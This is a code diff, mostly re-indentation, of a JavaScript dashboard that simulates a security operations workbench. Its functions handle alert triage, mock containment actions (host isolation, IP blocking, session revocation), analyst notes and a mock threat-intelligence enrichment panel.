+                const openCriticals = alertsData.filter(a => a.severity === "Critical" && a.status !==
+                    "Contained" && a.status !== "False Positive").length;
+                const totalActive = alertsData.filter(a => a.status !== "Contained" && a.status !==
+                    "False Positive").length;
+
+                document.getElementById("kpiCriticalCount").textContent = openCriticals;
+                document.getElementById("kpiFilteredCount").textContent = filteredCount;
+                document.getElementById("navQueueBadge").textContent = totalActive;
+
+                const threatEl = document.getElementById("kpiThreatLevel");
+                if (openCriticals >= 3) {
+                    threatEl.textContent = "DEFCON 2 // CRITICAL";
+                    threatEl.className = "kpi-value text-danger";
+                } else if (openCriticals >= 1) {
+                    threatEl.textContent = "DEFCON 3 // ELEVATED";
+                    threatEl.className = "kpi-value text-warning";
+                } else {
+                    threatEl.textContent = "DEFCON 4 // GUARDED";
+                    threatEl.className = "kpi-value text-success";
                 }
+            }
 
-                function updateTopKpis(filteredCount) {
-                    const openCriticals = alertsData.filter(a => a.severity === "Critical" && a.status !==
-                        "Contained" && a.status !== "False Positive").length;
-                    const totalActive = alertsData.filter(a => a.status !== "Contained" && a.status !==
-                        "False Positive").length;
+            /********************************************************************
+             * 5. RIGHT DRAWER: ALERT SELECTION & SOAR PLAYBOOK EXECUTION
+             ********************************************************************/
+            function selectAlert(alertId) {
+                selectedAlertId = alertId;
+                const alert = alertsData.find(a => a.id === alertId);
+                if (!alert) return;
 
-                    document.getElementById("kpiCriticalCount").textContent = openCriticals;
-                    document.getElementById("kpiFilteredCount").textContent = filteredCount;
-                    document.getElementById("navQueueBadge").textContent = totalActive;
+                // Ensure drawer is visible
+                document.getElementById("soarDrawer").classList.remove("collapsed");
 
-                    const threatEl = document.getElementById("kpiThreatLevel");
-                    if (openCriticals >= 3) {
-                        threatEl.textContent = "DEFCON 2 // CRITICAL";
-                        threatEl.className = "kpi-value text-danger";
-                    } else if (openCriticals >= 1) {
-                        threatEl.textContent = "DEFCON 3 // ELEVATED";
-                        threatEl.className = "kpi-value text-warning";
-                    } else {
-                        threatEl.textContent = "DEFCON 4 // GUARDED";
-                        threatEl.className = "kpi-value text-success";
-                    }
-                }
+                // Populate Drawer Header & Telemetry
+                document.getElementById("drawerAlertId").textContent = alert.id;
+                const sevBadge = document.getElementById("drawerSeverityBadge");
+                sevBadge.textContent = alert.severity.toUpperCase();
+                sevBadge.className = `badge-sev sev-${alert.severity}`;
 
-                /********************************************************************
-                 * 5. RIGHT DRAWER: ALERT SELECTION & SOAR PLAYBOOK EXECUTION
-                 ********************************************************************/
-                function selectAlert(alertId) {
-                    selectedAlertId = alertId;
-                    const alert = alertsData.find(a => a.id === alertId);
-                    if (!alert) return;
+                document.getElementById("drawerContainedBadge").classList.toggle("d-none", alert.status !==
+                    "Contained");
+                document.getElementById("drawerAlertTitle").textContent = alert.title;
+                document.getElementById("drawerSrcIp").textContent = alert.srcIp;
+                document.getElementById("drawerHostname").textContent = alert.hostname;
+                document.getElementById("drawerMitre").textContent = `${alert.mitreId} (${alert.mitreName})`;
+                document.getElementById("drawerCve").textContent = alert.cve;
 
-                    // Ensure drawer is visible
-                    document.getElementById("soarDrawer").classList.remove("collapsed");
+                document.getElementById("drawerStatusSelect").value = alert.status;
+                document.getElementById("drawerAssigneeSelect").value = alert.assignee;
 
-                    // Populate Drawer Header & Telemetry
-                    document.getElementById("drawerAlertId").textContent = alert.id;
-                    const sevBadge = document.getElementById("drawerSeverityBadge");
-                    sevBadge.textContent = alert.severity.toUpperCase();
-                    sevBadge.className = `badge-sev sev-${alert.severity}`;
+                // Update SOAR Action Button States
+                updateSoarButtonsUI(alert);
 
-                    document.getElementById("drawerContainedBadge").classList.toggle("d-none", alert.status !==
-                        "Contained");
-                    document.getElementById("drawerAlertTitle").textContent = alert.title;
-                    document.getElementById("drawerSrcIp").textContent = alert.srcIp;
-                    document.getElementById("drawerHostname").textContent = alert.hostname;
-                    document.getElementById("drawerMitre").textContent = `${alert.mitreId} (${alert.mitreName})`;
-                    document.getElementById("drawerCve").textContent = alert.cve;
+                // Render Playbook Checklist
+                renderDrawerChecklist(alert);
 
-                    document.getElementById("drawerStatusSelect").value = alert.status;
-                    document.getElementById("drawerAssigneeSelect").value = alert.assignee;
+                // Render Analyst Notes
+                renderDrawerNotes(alert);
 
-                    // Update SOAR Action Button States
-                    updateSoarButtonsUI(alert);
-
-                    // Render Playbook Checklist
-                    renderDrawerChecklist(alert);
-
-                    // Render Analyst Notes
-                    renderDrawerNotes(alert);
-
-                    // Initialize Terminal Output for selected alert
-                    const term = document.getElementById("soarTerminal");
-                    term.innerHTML = `
+                // Initialize Terminal Output for selected alert
+                const term = document.getElementById("soarTerminal");
+                term.innerHTML = `
       <div class="term-line"><span class="term-ts">[${alert.timestamp}]</span> <span class="term-cmd">SIEM_INGEST</span> Alert <span class="text-info">${alert.id}</span> loaded into SOAR workbench.</div>
       <div class="term-line"><span class="term-ts">[${alert.timestamp}]</span> Target Asset: <span class="text-light">${alert.hostname}</span> | Source IP: <span class="text-warning">${alert.srcIp}</span></div>
       ${alert.isolated ? `<div class="term-line"><span class="term-ok">[STATE] CrowdStrike EDR Containment Lock ACTIVE on ${alert.hostname}.</span></div>` : ""}
       ${alert.ipBlocked ? `<div class="term-line"><span class="term-ok">[STATE] Source IP ${alert.srcIp} present in PAN-OS Edge Deny-List.</span></div>` : ""}
     `;
 
-                    renderSiemTable();
+                renderSiemTable();
+            }
+
+            function updateSoarButtonsUI(alert) {
+                const btnIsolate = document.getElementById("btnIsolateHost");
+                const btnIsolateText = document.getElementById("btnIsolateHostText");
+                if (alert.isolated) {
+                    btnIsolate.className =
+                        "btn btn-sm btn-danger d-flex align-items-center justify-content-between px-3 py-2";
+                    btnIsolateText.textContent = `Lift Containment on ${alert.hostname} (Isolated)`;
+                } else {
+                    btnIsolate.className =
+                        "btn btn-sm btn-outline-danger d-flex align-items-center justify-content-between px-3 py-2";
+                    btnIsolateText.textContent = `Isolate ${alert.hostname} via CrowdStrike EDR`;
                 }
 
-                function updateSoarButtonsUI(alert) {
-                    const btnIsolate = document.getElementById("btnIsolateHost");
-                    const btnIsolateText = document.getElementById("btnIsolateHostText");
+                const btnBlock = document.getElementById("btnBlockIp");
+                const btnBlockText = document.getElementById("btnBlockIpText");
+                if (alert.ipBlocked) {
+                    btnBlock.className =
+                        "btn btn-sm btn-warning text-dark d-flex align-items-center justify-content-between px-3 py-2";
+                    btnBlockText.textContent = `IP ${alert.srcIp} Blocked at Edge Firewall`;
+                } else {
+                    btnBlock.className =
+                        "btn btn-sm btn-outline-warning d-flex align-items-center justify-content-between px-3 py-2";
+                    btnBlockText.textContent = `Block ${alert.srcIp} at Palo Alto Edge FW`;
+                }
+
+                const btnRevoke = document.getElementById("btnRevokeTokens");
+                const btnRevokeText = document.getElementById("btnRevokeTokensText");
+                if (alert.tokensRevoked) {
+                    btnRevoke.className =
+                        "btn btn-sm btn-info text-dark d-flex align-items-center justify-content-between px-3 py-2";
+                    btnRevokeText.textContent = `Sessions Revoked for ${alert.user}`;
+                } else {
+                    btnRevoke.className =
+                        "btn btn-sm btn-outline-info d-flex align-items-center justify-content-between px-3 py-2";
+                    btnRevokeText.textContent = `Revoke Active OAuth / Entra ID Sessions`;
+                }
+            }
+
+            function executeSoarAction(actionType) {
+                const alert = alertsData.find(a => a.id === selectedAlertId);
+                if (!alert) return;
+
+                const nowTs = new Date().toISOString().substring(11, 19) + " UTC";
+
+                if (actionType === "ISOLATE_HOST") {
+                    alert.isolated = !alert.isolated;
                     if (alert.isolated) {
-                        btnIsolate.className =
-                            "btn btn-sm btn-danger d-flex align-items-center justify-content-between px-3 py-2";
-                        btnIsolateText.textContent = `Lift Containment on ${alert.hostname} (Isolated)`;
-                    } else {
-                        btnIsolate.className =
-                            "btn btn-sm btn-outline-danger d-flex align-items-center justify-content-between px-3 py-2";
-                        btnIsolateText.textContent = `Isolate ${alert.hostname} via CrowdStrike EDR`;
-                    }
-
-                    const btnBlock = document.getElementById("btnBlockIp");
-                    const btnBlockText = document.getElementById("btnBlockIpText");
-                    if (alert.ipBlocked) {
-                        btnBlock.className =
-                            "btn btn-sm btn-warning text-dark d-flex align-items-center justify-content-between px-3 py-2";
-                        btnBlockText.textContent = `IP ${alert.srcIp} Blocked at Edge Firewall`;
-                    } else {
-                        btnBlock.className =
-                            "btn btn-sm btn-outline-warning d-flex align-items-center justify-content-between px-3 py-2";
-                        btnBlockText.textContent = `Block ${alert.srcIp} at Palo Alto Edge FW`;
-                    }
-
-                    const btnRevoke = document.getElementById("btnRevokeTokens");
-                    const btnRevokeText = document.getElementById("btnRevokeTokensText");
-                    if (alert.tokensRevoked) {
-                        btnRevoke.className =
-                            "btn btn-sm btn-info text-dark d-flex align-items-center justify-content-between px-3 py-2";
-                        btnRevokeText.textContent = `Sessions Revoked for ${alert.user}`;
-                    } else {
-                        btnRevoke.className =
-                            "btn btn-sm btn-outline-info d-flex align-items-center justify-content-between px-3 py-2";
-                        btnRevokeText.textContent = `Revoke Active OAuth / Entra ID Sessions`;
-                    }
-                }
-
-                function executeSoarAction(actionType) {
-                    const alert = alertsData.find(a => a.id === selectedAlertId);
-                    if (!alert) return;
-
-                    const nowTs = new Date().toISOString().substring(11, 19) + " UTC";
-
-                    if (actionType === "ISOLATE_HOST") {
-                        alert.isolated = !alert.isolated;
-                        if (alert.isolated) {
-                            appendTerminalLine(nowTs, "FALCON_API",
-                                `POST /devices/entities/devices-actions/v2?action_name=contain -> Host ${alert.hostname}`,
-                                "term-cmd");
-                            appendTerminalLine(nowTs, "FALCON_EDR",
-                                `SUCCESS: Network containment applied to ${alert.hostname} (AID: 8841a9c0).`,
-                                "term-ok");
-                            alert.notes.unshift({
-                                ts: nowTs,
-                                author: "SOAR Playbook",
-                                text: `Endpoint ${alert.hostname} isolated via CrowdStrike Falcon API.`
-                            });
-                            showSocToast(`Isolated host ${alert.hostname} via EDR`, "danger");
-                        } else {
-                            appendTerminalLine(nowTs, "FALCON_EDR",
-                                `Lifting containment lock on ${alert.hostname}... Normal network I/O restored.`,
-                                "term-warn");
-                            alert.notes.unshift({
-                                ts: nowTs,
-                                author: "SOAR Playbook",
-                                text: `Endpoint ${alert.hostname} network isolation lifted.`
-                            });
-                            showSocToast(`Lifted network isolation on ${alert.hostname}`, "info");
-                        }
-                    } else if (actionType === "BLOCK_IP") {
-                        alert.ipBlocked = !alert.ipBlocked;
-                        if (alert.ipBlocked) {
-                            appendTerminalLine(nowTs, "PANOS_XMLAPI",
-                                `Adding ${alert.srcIp}/32 to Dynamic Address Group [DAG-SOC-BLOCKLIST]...`,
-                                "term-cmd");
-                            appendTerminalLine(nowTs, "PANOS_COMMIT",
-                                `SUCCESS: Commit job #4912 completed on FW-EDGE-LON01. Traffic dropped.`,
-                                "term-ok");
-                            alert.notes.unshift({
-                                ts: nowTs,
-                                author: "SOAR Playbook",
-                                text: `Blocked source IP ${alert.srcIp} on perimeter Palo Alto firewall.`
-                            });
-                            showSocToast(`Blocked ${alert.srcIp} at Edge Firewall`, "warning");
-                        } else {
-                            appendTerminalLine(nowTs, "PANOS_XMLAPI",
-                                `Removed ${alert.srcIp} from DAG-SOC-BLOCKLIST.`,
-                                "term-warn");
-                            showSocToast(`Removed ${alert.srcIp} from firewall blocklist`, "info");
-                        }
-                    } else if (actionType === "REVOKE_TOKENS") {
-                        alert.tokensRevoked = true;
-                        appendTerminalLine(nowTs, "MS_GRAPH_API", `POST /users/${alert.user}/revokeSignInSessions`,
+                        appendTerminalLine(nowTs, "FALCON_API",
+                            `POST /devices/entities/devices-actions/v2?action_name=contain -> Host ${alert.hostname}`,
                             "term-cmd");
-                        appendTerminalLine(nowTs, "ENTRA_ID",
-                            `SUCCESS: All OAuth 2.0 refresh tokens & Kerberos tickets invalidated for ${alert.user}.`,
+                        appendTerminalLine(nowTs, "FALCON_EDR",
+                            `SUCCESS: Network containment applied to ${alert.hostname} (AID: 8841a9c0).`,
                             "term-ok");
                         alert.notes.unshift({
                             ts: nowTs,
                             author: "SOAR Playbook",
-                            text: `Revoked all active sessions and OAuth refresh tokens for ${alert.user}.`
+                            text: `Endpoint ${alert.hostname} isolated via CrowdStrike Falcon API.`
                         });
-                        showSocToast(`Revoked active sessions for ${alert.user}`, "info");
+                        showSocToast(`Isolated host ${alert.hostname} via EDR`, "danger");
+                    } else {
+                        appendTerminalLine(nowTs, "FALCON_EDR",
+                            `Lifting containment lock on ${alert.hostname}... Normal network I/O restored.`,
+                            "term-warn");
+                        alert.notes.unshift({
+                            ts: nowTs,
+                            author: "SOAR Playbook",
+                            text: `Endpoint ${alert.hostname} network isolation lifted.`
+                        });
+                        showSocToast(`Lifted network isolation on ${alert.hostname}`, "info");
                     }
-
-                    // Automatically transition status to Contained if both host isolated or IP blocked
-                    if ((alert.isolated || alert.ipBlocked) && alert.status === "New") {
-                        alert.status = "Investigating";
-                        document.getElementById("drawerStatusSelect").value = "Investigating";
+                } else if (actionType === "BLOCK_IP") {
+                    alert.ipBlocked = !alert.ipBlocked;
+                    if (alert.ipBlocked) {
+                        appendTerminalLine(nowTs, "PANOS_XMLAPI",
+                            `Adding ${alert.srcIp}/32 to Dynamic Address Group [DAG-SOC-BLOCKLIST]...`,
+                            "term-cmd");
+                        appendTerminalLine(nowTs, "PANOS_COMMIT",
+                            `SUCCESS: Commit job #4912 completed on FW-EDGE-LON01. Traffic dropped.`,
+                            "term-ok");
+                        alert.notes.unshift({
+                            ts: nowTs,
+                            author: "SOAR Playbook",
+                            text: `Blocked source IP ${alert.srcIp} on perimeter Palo Alto firewall.`
+                        });
+                        showSocToast(`Blocked ${alert.srcIp} at Edge Firewall`, "warning");
+                    } else {
+                        appendTerminalLine(nowTs, "PANOS_XMLAPI",
+                            `Removed ${alert.srcIp} from DAG-SOC-BLOCKLIST.`,
+                            "term-warn");
+                        showSocToast(`Removed ${alert.srcIp} from firewall blocklist`, "info");
                     }
-
-                    updateSoarButtonsUI(alert);
-                    renderDrawerNotes(alert);
-                    renderSiemTable();
-                    updateSidebarBlocklist();
+                } else if (actionType === "REVOKE_TOKENS") {
+                    alert.tokensRevoked = true;
+                    appendTerminalLine(nowTs, "MS_GRAPH_API", `POST /users/${alert.user}/revokeSignInSessions`,
+                        "term-cmd");
+                    appendTerminalLine(nowTs, "ENTRA_ID",
+                        `SUCCESS: All OAuth 2.0 refresh tokens & Kerberos tickets invalidated for ${alert.user}.`,
+                        "term-ok");
+                    alert.notes.unshift({
+                        ts: nowTs,
+                        author: "SOAR Playbook",
+                        text: `Revoked all active sessions and OAuth refresh tokens for ${alert.user}.`
+                    });
+                    showSocToast(`Revoked active sessions for ${alert.user}`, "info");
                 }
 
-                function appendTerminalLine(ts, module, message, cls = "") {
-                    const term = document.getElementById("soarTerminal");
+                // Automatically transition status to Contained if both host isolated or IP blocked
+                if ((alert.isolated || alert.ipBlocked) && alert.status === "New") {
+                    alert.status = "Investigating";
+                    document.getElementById("drawerStatusSelect").value = "Investigating";
+                }
+
+                updateSoarButtonsUI(alert);
+                renderDrawerNotes(alert);
+                renderSiemTable();
+                updateSidebarBlocklist();
+            }
+
+            function appendTerminalLine(ts, module, message, cls = "") {
+                const term = document.getElementById("soarTerminal");
+                const div = document.createElement("div");
+                div.className = "term-line";
+                div.innerHTML =
+                    `<span class="term-ts">[${ts}]</span> <span class="term-cmd">[${module}]</span> <span class="${cls}">${message}</span>`;
+                term.appendChild(div);
+                term.scrollTop = term.scrollHeight;
+            }
+
+            function renderDrawerChecklist(alert) {
+                const container = document.getElementById("drawerChecklist");
+                container.innerHTML = "";
+                alert.checklist.forEach((item, idx) => {
                     const div = document.createElement("div");
-                    div.className = "term-line";
-                    div.innerHTML =
-                        `<span class="term-ts">[${ts}]</span> <span class="term-cmd">[${module}]</span> <span class="${cls}">${message}</span>`;
-                    term.appendChild(div);
-                    term.scrollTop = term.scrollHeight;
-                }
-
-                function renderDrawerChecklist(alert) {
-                    const container = document.getElementById("drawerChecklist");
-                    container.innerHTML = "";
-                    alert.checklist.forEach((item, idx) => {
-                        const div = document.createElement("div");
-                        div.className = "form-check small mb-1";
-                        div.innerHTML = `
+                    div.className = "form-check small mb-1";
+                    div.innerHTML = `
         <input class="form-check-input" type="checkbox" id="chk_${alert.id}_${idx}" ${item.done ? "checked" : ""} onchange="toggleChecklistItem(${idx})">
         <label class="form-check-label ${item.done ? 'text-decoration-line-through text-secondary' : ''}" for="chk_${alert.id}_${idx}">
           ${item.text}
         </label>
       `;
-                        container.appendChild(div);
-                    });
-                }
+                    container.appendChild(div);
+                });
+            }
 
-                function toggleChecklistItem(idx) {
-                    const alert = alertsData.find(a => a.id === selectedAlertId);
-                    if (!alert) return;
-                    alert.checklist[idx].done = !alert.checklist[idx].done;
-                    renderDrawerChecklist(alert);
+            function toggleChecklistItem(idx) {
+                const alert = alertsData.find(a => a.id === selectedAlertId);
+                if (!alert) return;
+                alert.checklist[idx].done = !alert.checklist[idx].done;
+                renderDrawerChecklist(alert);
 
-                    const allDone = alert.checklist.every(c => c.done);
-                    if (allDone && alert.status !== "Contained") {
-                        alert.status = "Contained";
-                        document.getElementById("drawerStatusSelect").value = "Contained";
-                        document.getElementById("drawerContainedBadge").classList.remove("d-none");
-                        renderSiemTable();
-                        showSocToast(`All playbook steps complete! Alert ${alert.id} marked Contained.`, "success");
-                    }
-                }
-
-                function updateActiveAlertStatus(newStatus) {
-                    const alert = alertsData.find(a => a.id === selectedAlertId);
-                    if (!alert) return;
-                    alert.status = newStatus;
-                    document.getElementById("drawerContainedBadge").classList.toggle("d-none", newStatus !==
-                        "Contained");
-                    const nowTs = new Date().toISOString().substring(11, 19) + " UTC";
-                    alert.notes.unshift({
-                        ts: nowTs,
-                        author: "A. Mercer (T2)",
-                        text: `Status updated to [${newStatus}].`
-                    });
-                    renderDrawerNotes(alert);
+                const allDone = alert.checklist.every(c => c.done);
+                if (allDone && alert.status !== "Contained") {
+                    alert.status = "Contained";
+                    document.getElementById("drawerStatusSelect").value = "Contained";
+                    document.getElementById("drawerContainedBadge").classList.remove("d-none");
                     renderSiemTable();
-                    showSocToast(`${alert.id} status set to ${newStatus}`, "info");
+                    showSocToast(`All playbook steps complete! Alert ${alert.id} marked Contained.`, "success");
                 }
+            }
 
-                function updateActiveAlertAssignee(newAssignee) {
-                    const alert = alertsData.find(a => a.id === selectedAlertId);
-                    if (!alert) return;
-                    alert.assignee = newAssignee;
-                    renderSiemTable();
-                    showSocToast(`${alert.id} assigned to ${newAssignee}`, "info");
-                }
+            function updateActiveAlertStatus(newStatus) {
+                const alert = alertsData.find(a => a.id === selectedAlertId);
+                if (!alert) return;
+                alert.status = newStatus;
+                document.getElementById("drawerContainedBadge").classList.toggle("d-none", newStatus !==
+                    "Contained");
+                const nowTs = new Date().toISOString().substring(11, 19) + " UTC";
+                alert.notes.unshift({
+                    ts: nowTs,
+                    author: "A. Mercer (T2)",
+                    text: `Status updated to [${newStatus}].`
+                });
+                renderDrawerNotes(alert);
+                renderSiemTable();
+                showSocToast(`${alert.id} status set to ${newStatus}`, "info");
+            }
 
-                function addAnalystNote() {
-                    const input = document.getElementById("analystNoteInput");
-                    const text = input.value.trim();
-                    if (!text) return;
+            function updateActiveAlertAssignee(newAssignee) {
+                const alert = alertsData.find(a => a.id === selectedAlertId);
+                if (!alert) return;
+                alert.assignee = newAssignee;
+                renderSiemTable();
+                showSocToast(`${alert.id} assigned to ${newAssignee}`, "info");
+            }
 
-                    const alert = alertsData.find(a => a.id === selectedAlertId);
-                    if (!alert) return;
+            function addAnalystNote() {
+                const input = document.getElementById("analystNoteInput");
+                const text = input.value.trim();
+                if (!text) return;
 
-                    const nowTs = new Date().toISOString().substring(11, 19) + " UTC";
-                    alert.notes.unshift({
-                        ts: nowTs,
-                        author: "A. Mercer (T2)",
-                        text
-                    });
-                    input.value = "";
-                    renderDrawerNotes(alert);
-                    appendTerminalLine(nowTs, "CASE_LOG", `Note appended by A. Mercer (T2)`, "term-ok");
-                }
+                const alert = alertsData.find(a => a.id === selectedAlertId);
+                if (!alert) return;
 
-                function renderDrawerNotes(alert) {
-                    const list = document.getElementById("drawerNotesList");
-                    list.innerHTML = "";
-                    alert.notes.forEach(n => {
-                        const item = document.createElement("div");
-                        item.className = "p-2 rounded small";
-                        item.style.background = "var(--soc-bg-elevated)";
-                        item.style.border = "1px solid var(--soc-border)";
-                        item.innerHTML = `
+                const nowTs = new Date().toISOString().substring(11, 19) + " UTC";
+                alert.notes.unshift({
+                    ts: nowTs,
+                    author: "A. Mercer (T2)",
+                    text
+                });
+                input.value = "";
+                renderDrawerNotes(alert);
+                appendTerminalLine(nowTs, "CASE_LOG", `Note appended by A. Mercer (T2)`, "term-ok");
+            }
+
+            function renderDrawerNotes(alert) {
+                const list = document.getElementById("drawerNotesList");
+                list.innerHTML = "";
+                alert.notes.forEach(n => {
+                    const item = document.createElement("div");
+                    item.className = "p-2 rounded small";
+                    item.style.background = "var(--soc-bg-elevated)";
+                    item.style.border = "1px solid var(--soc-border)";
+                    item.innerHTML = `
         <div class="d-flex justify-content-between mono text-secondary" style="font-size: 0.68rem;">
           <span class="text-info fw-semibold">${n.author}</span>
           <span>${n.ts}</span>
         </div>
         <div class="mt-1">${n.text}</div>
       `;
-                        list.appendChild(item);
-                    });
-                }
+                    list.appendChild(item);
+                });
+            }
 
-                function updateSidebarBlocklist() {
-                    const blockedIps = [...new Set(alertsData.filter(a => a.ipBlocked).map(a => a.srcIp))];
-                    const isolatedHosts = [...new Set(alertsData.filter(a => a.isolated).map(a => a.hostname))];
+            function updateSidebarBlocklist() {
+                const blockedIps = [...new Set(alertsData.filter(a => a.ipBlocked).map(a => a.srcIp))];
+                const isolatedHosts = [...new Set(alertsData.filter(a => a.isolated).map(a => a.hostname))];
 
-                    document.getElementById("sidebarBlockedCount").textContent = blockedIps.length;
-                    document.getElementById("sidebarIsolatedCount").textContent = isolatedHosts.length;
+                document.getElementById("sidebarBlockedCount").textContent = blockedIps.length;
+                document.getElementById("sidebarIsolatedCount").textContent = isolatedHosts.length;
 
-                    const preview = document.getElementById("sidebarBlocklistPreview");
-                    preview.innerHTML = [
-                        ...isolatedHosts.map(h => `<div class="text-danger">• [HOST] ${h}</div>`),
-                        ...blockedIps.map(ip => `<div class="text-warning">• [DENY] ${ip}</div>`)
-                    ].join("");
-                }
+                const preview = document.getElementById("sidebarBlocklistPreview");
+                preview.innerHTML = [
+                    ...isolatedHosts.map(h => `<div class="text-danger">• [HOST] ${h}</div>`),
+                    ...blockedIps.map(ip => `<div class="text-warning">• [DENY] ${ip}</div>`)
+                ].join("");
+            }
 
-                /********************************************************************
-                 * 6. SIMULATE INCOMING SIEM ALERT
-                 ********************************************************************/
-                function simulateIncomingAlert() {
-                    const template = incomingAlertTemplates[Math.floor(Math.random() * incomingAlertTemplates
-                        .length)];
-                    const nowTs = new Date().toISOString().substring(11, 19) + " UTC";
-                    const newId = `ALT-${simCounter++}`;
+            /********************************************************************
+             * 6. SIMULATE INCOMING SIEM ALERT
+             ********************************************************************/
+            function simulateIncomingAlert() {
+                const template = incomingAlertTemplates[Math.floor(Math.random() * incomingAlertTemplates
+                    .length)];
+                const nowTs = new Date().toISOString().substring(11, 19) + " UTC";
+                const newId = `ALT-${simCounter++}`;
 
-                    const newAlert = {
-                        id: newId,
-                        timestamp: nowTs,
-                        severity: template.severity,
-                        title: template.title,
-                        mitreId: template.mitreId,
-                        mitreName: template.mitreName,
-                        cve: template.cve,
-                        srcIp: template.srcIp,
-                        hostname: template.hostname,
-                        user: template.user,
-                        status: "New",
-                        assignee: "Unassigned",
-                        isolated: false,
-                        ipBlocked: false,
-                        tokensRevoked: false,
-                        checklist: [{
-                                text: `Validate raw telemetry for ${template.mitreId} (${template.mitreName})`,
-                                done: false
-                            },
-                            {
-                                text: `Enrich source IP ${template.srcIp} in Threat Intel Sandbox`,
-                                done: false
-                            },
-                            {
-                                text: `Isolate ${template.hostname} or revoke compromised credentials`,
-                                done: false
-                            }
-                        ],
-                        notes: [{
-                            ts: nowTs,
-                            author: "SIEM Correlation Engine",
-                            text: `High-priority detection rule triggered on ${template.hostname}.`
-                        }],
-                        rawLog: template.rawLog
-                    };
+                const newAlert = {
+                    id: newId,
+                    timestamp: nowTs,
+                    severity: template.severity,
+                    title: template.title,
+                    mitreId: template.mitreId,
+                    mitreName: template.mitreName,
+                    cve: template.cve,
+                    srcIp: template.srcIp,
+                    hostname: template.hostname,
+                    user: template.user,
+                    status: "New",
+                    assignee: "Unassigned",
+                    isolated: false,
+                    ipBlocked: false,
+                    tokensRevoked: false,
+                    checklist: [{
+                            text: `Validate raw telemetry for ${template.mitreId} (${template.mitreName})`,
+                            done: false
+                        },
+                        {
+                            text: `Enrich source IP ${template.srcIp} in Threat Intel Sandbox`,
+                            done: false
+                        },
+                        {
+                            text: `Isolate ${template.hostname} or revoke compromised credentials`,
+                            done: false
+                        }
+                    ],
+                    notes: [{
+                        ts: nowTs,
+                        author: "SIEM Correlation Engine",
+                        text: `High-priority detection rule triggered on ${template.hostname}.`
+                    }],
+                    rawLog: template.rawLog
+                };
 
-                    alertsData.unshift(newAlert);
-                    renderSiemTable();
-                    selectAlert(newId);
-                    showSocToast(`Incoming ${newAlert.severity} Alert [${newId}]: ${newAlert.title}`, "danger");
-                }
+                alertsData.unshift(newAlert);
+                renderSiemTable();
+                selectAlert(newId);
+                showSocToast(`Incoming ${newAlert.severity} Alert [${newId}]: ${newAlert.title}`, "danger");
+            }
 
-                /********************************************************************
-                 * 7. IOC THREAT INTELLIGENCE ENRICHMENT ENGINE
-                 ********************************************************************/
-                function quickFillIoc(iocValue) {
-                    document.getElementById("iocInput").value = iocValue;
-                    runIocEnrichment();
-                }
+            /********************************************************************
+             * 7. IOC THREAT INTELLIGENCE ENRICHMENT ENGINE
+             ********************************************************************/
+            function quickFillIoc(iocValue) {
+                document.getElementById("iocInput").value = iocValue;
+                runIocEnrichment();
+            }
 
-                function pivotiocFromDrawer() {
-                    const alert = alertsData.find(a => a.id === selectedAlertId);
-                    if (!alert) return;
-                    switchWorkspaceTab("tab-ioc");
-                    quickFillIoc(alert.srcIp);
-                }
+            function pivotiocFromDrawer() {
+                const alert = alertsData.find(a => a.id === selectedAlertId);
+                if (!alert) return;
+                switchWorkspaceTab("tab-ioc");
+                quickFillIoc(alert.srcIp);
+            }
 
-                function runIocEnrichment() {
-                    const rawQuery = document.getElementById("iocInput").value.trim();
-                    if (!rawQuery) return;
+            function runIocEnrichment() {
+                const rawQuery = document.getElementById("iocInput").value.trim();
+                if (!rawQuery) return;
 
-                    const intel = ctiDatabase[rawQuery] || {
-                        type: rawQuery.includes(".") ? "IPv4 / Host Indicator" : "Unclassified Indicator",
-                        riskScore: 42,
-                        verdict: "SUSPICIOUS // UNVERIFIED TELEMETRY",
-                        vtDetections: "6 / 92 Security Vendors",
-                        abuseConfidence: "28% (14 Reports)",
-                        asn: "AS14061 (DigitalOcean Cloud Subnet)",
-                        country: "United States (US)",
-                        mitre: ["T1595 (Active Scanning)", "T1071 (Standard Application Layer)"],
-                        threatActor: "Unattributed Cloud VPS",
-                        summary: `Heuristic enrichment for ${rawQuery} shows low-to-moderate scanning noise across global honeypots.`
-                    };
+                const intel = ctiDatabase[rawQuery] || {
+                    type: rawQuery.includes(".") ? "IPv4 / Host Indicator" : "Unclassified Indicator",
+                    riskScore: 42,
+                    verdict: "SUSPICIOUS // UNVERIFIED TELEMETRY",
+                    vtDetections: "6 / 92 Security Vendors",
+                    abuseConfidence: "28% (14 Reports)",
+                    asn: "AS14061 (DigitalOcean Cloud Subnet)",
+                    country: "United States (US)",
+                    mitre: ["T1595 (Active Scanning)", "T1071 (Standard Application Layer)"],
+                    threatActor: "Unattributed Cloud VPS",
+                    summary: `Heuristic enrichment for ${rawQuery} shows low-to-moderate scanning noise across global honeypots.`
+                };
 
-                    const scoreColor = intel.riskScore >= 75 ? "#ef4444" : intel.riskScore >= 40 ? "#eab308" :
-                        "#10b981";
-                    const circumference = 2 * Math.PI * 44;
-                    const dashOffset = circumference - (intel.riskScore / 100) * circumference;
+                const scoreColor = intel.riskScore >= 75 ? "#ef4444" : intel.riskScore >= 40 ? "#eab308" :
+                    "#10b981";
+                const circumference = 2 * Math.PI * 44;
+                const dashOffset = circumference - (intel.riskScore / 100) * circumference;
 
-                    const container = document.getElementById("iocResultsContainer");
-                    container.innerHTML = `
+                const container = document.getElementById("iocResultsContainer");
+                container.innerHTML = `
       <div class="row g-3">
         <!-- Visual Risk Score Gauge Card -->
         <div class="col-12 col-lg-4">
@@ -2156,66 +2151,66 @@
         </div>
       </div>
     `;
-                }
+            }
 
-                function blockIocFromIntel(ioc) {
-                    const nowTs = new Date().toISOString().substring(11, 19) + " UTC";
-                    let matched = false;
-                    alertsData.forEach(a => {
-                        if (a.srcIp === ioc) {
-                            a.ipBlocked = true;
-                            matched = true;
-                        }
-                    });
-                    if (!matched) {
-                        // Also attach to current selected alert block state if relevant
-                        const active = alertsData.find(a => a.id === selectedAlertId);
-                        if (active) {
-                            active.notes.unshift({
-                                ts: nowTs,
-                                author: "CTI Sandbox",
-                                text: `Indicator [${ioc}] pushed to Palo Alto EDL Blocklist.`
-                            });
-                            renderDrawerNotes(active);
-                        }
+            function blockIocFromIntel(ioc) {
+                const nowTs = new Date().toISOString().substring(11, 19) + " UTC";
+                let matched = false;
+                alertsData.forEach(a => {
+                    if (a.srcIp === ioc) {
+                        a.ipBlocked = true;
+                        matched = true;
                     }
-                    renderSiemTable();
-                    updateSidebarBlocklist();
-                    showSocToast(`Indicator [${ioc}] added to Edge Firewall EDL Blocklist`, "warning");
+                });
+                if (!matched) {
+                    // Also attach to current selected alert block state if relevant
+                    const active = alertsData.find(a => a.id === selectedAlertId);
